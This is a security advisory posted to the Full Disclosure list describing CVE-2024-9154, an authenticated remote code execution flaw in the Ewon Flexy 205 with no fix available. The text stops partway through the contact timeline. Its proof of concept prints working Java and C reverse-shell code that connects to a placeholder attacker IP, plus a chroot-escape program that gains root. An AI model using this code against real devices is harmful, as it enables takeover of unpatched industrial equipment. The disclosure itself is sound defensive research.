---
title: CyberDanube Security Research 20241219-0 | Authenticated Remote Code Execution in Ewon Flexy 205
url: https://seclists.org/fulldisclosure/2024/Dec/18
source: Full Disclosure
date: 2024-12-23
fetch_date: 2025-10-06T19:41:39.728416
---

# CyberDanube Security Research 20241219-0 | Authenticated Remote Code Execution in Ewon Flexy 205

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](17)
[By Date](date.html#18)
[![Next](/images/right-icon-16x16.png)](19)

[![Previous](/images/left-icon-16x16.png)](17)
[By Thread](index.html#18)
[![Next](/images/right-icon-16x16.png)](19)

![](/shared/images/nst-icons.svg#search)

# CyberDanube Security Research 20241219-0 | Authenticated Remote Code Execution in Ewon Flexy 205

---

*From*: Thomas Weber | CyberDanube via Fulldisclosure <fulldisclosure () seclists org>
*Date*: Thu, 19 Dec 2024 16:04:09 +0000

---

```
CyberDanube Security Research 20241219-0
-------------------------------------------------------------------------------
                title| Authenticated Remote Code Execution
              product| Ewon Flexy 205
   vulnerable version| <= v14.8s0 (#2633)
        fixed version| -
           CVE number| CVE-2024-9154
               impact| High
             homepage| https://www.hms-networks.com/
                found| 2024-09-03
                   by| T. Fankhauser (Office Vienna)
                     | CyberDanube Security Research
                     | Vienna
                     |
                     | https://www.cyberdanube.com
-------------------------------------------------------------------------------

Vendor description
-------------------------------------------------------------------------------
"HMS stands for Hardware Meets Software™. By enabling industrial equipment
(hardware) to communicate and share information with software and systems, our
customers increase productivity and sustainability.
HMS Networks was founded in 1988 in Halmstad, Sweden where you still find our
head office. Today, millions of industrial devices all over the world use HMS
products to get connected. [...].

We enable industrial hardware to meet IoT software — liberating data from
machines for processing. The result? Increased productivity and
sustainability for our customers. [...]"

Source: https://www.hms-networks.com/about-hms/

Vulnerable versions
-------------------------------------------------------------------------------
Ewon Flexy 205 / v14.8s0 (#2633)

Vulnerability overview
-------------------------------------------------------------------------------
1) Authenticated Remote Code Execution (CVE-2024-9154)
It is possible to gain root access to the machine through the possibility to
run Java applications on the machine. Initial administration access to the
machine is necessary.

Proof of Concept
-------------------------------------------------------------------------------
1) Authenticated Remote Code Execution (CVE-2024-9154)
After initial access to the machine via the web interface and ftp is possible,
we can then upload Java applications (.jar) through FTP. These can then be
executed through calling the corresponding API endpoint:
===============================================================================
http://<IP>/rcgi.bin/jvmCmd?cmd=start&runCmd=%20-heapsize%205M%20-classpath%20/usr/<application_name>.jar%20-emain%20<java_classname>
===============================================================================

The Java application gets executed in its own sandbox, without permissions to
write new files or access any system files. This can be circumvented by using
a shared library written in C. The Java application's source code was the
following:

public class SimpleRequester {

    static {
        System.setProperty("java.library.path", "/usr/lib");
        System.out.println(System.getProperty("java.library.path"));

        System.loadLibrary("reverse_shell");
    }

    private native void open_reverse_shell(String ip, int port);

    public static void main(String[] args) {

        SimpleRequester requester = new SimpleRequester();
        String serverIp = "<attacker_IP>";
        int serverPort = 6666;

        try {
            requester.open_reverse_shell(serverIp, serverPort);
        } catch (Exception e) {
            System.out.println("Error: " + e.getMessage());
        }
    }
}

This code basically only loaded the shared library and called a certain
function of it with the IP and port of our attack machine, waiting for a
connection. Then the following C code was written for the shared library:

===============================================================================
#include <jni.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <string.h>
#include <errno.h>
#include <limits.h>
void make_busybox_executable() {
    if (chmod("./busybox", 0755) < 0) {
        perror("chmod");
    }
}void start_busybox_shell(int sockfd) {
    dup2(sockfd, STDIN_FILENO);
    dup2(sockfd, STDOUT_FILENO);
    dup2(sockfd, STDERR_FILENO);
    execl("./busybox", "sh", NULL);
    perror("execl");
    close(sockfd);
}

JNIEXPORT void JNICALL Java_SimpleRequester_open_1reverse_1shell(JNIEnv *env, jobject obj, jstring ip, jint port) {
    const char *ip_address = (*env)->GetStringUTFChars(env, ip, NULL);
    int sockfd;
    struct sockaddr_in serv_addr;
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        perror("socket");
        (*env)->ReleaseStringUTFChars(env, ip, ip_address);
        exit(1);
    }
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(port);
    inet_pton(AF_INET, ip_address, &serv_addr.sin_addr);
    if (connect(sockfd, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) < 0) {
        perror("connect");
        close(sockfd);
        (*env)->ReleaseStringUTFChars(env, ip, ip_address);
        exit(1);
    }    make_busybox_executable();    start_busybox_shell(sockfd);    close(sockfd);
    (*env)->ReleaseStringUTFChars(env, ip, ip_address);
}
===============================================================================
The shared library basically took a static shell binary, which we uploaded via
FTP, made it executable and started a reverse shell with the given IP and port
through the static shell binary. This allowed a reverse connection to the
attacking machine.

As the Java application is running in a "sandbox", which is using a chroot to a
folder without any binaries and just the files from the user's home directory,
it was then possible to use another C binary to escape this chroot and become
root user of the whole machine. The escape code was the following:

#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

int main(void)
{
    mkdir("chroot-dir", 0755);
    chroot("chroot-dir");
    for(int i = 0; i < 1000; i++) {
        chdir("..");
    }
    chroot(".");
    system("/bin/sh");
}

===============================================================================

Solution
-------------------------------------------------------------------------------
None.

Workaround
-------------------------------------------------------------------------------
Restrict network access to the device.

Recommendation
-------------------------------------------------------------------------------
Regardless to the current state of the vulnerability, CyberDanube recommends
customers from Ewon Flexy to upgrade the firmware to the latest version
available. Furthermore, a full security review by professionals is recommended.

Contact Timeline
-------------------------------------------------------------------------------
2024-09-26: Contacting HMS Networks via hms-csrt () hms-networks com.
2024-09-30: HMS Networks representative replies they will investigate.
2024-10-21: Asked for an update.
20...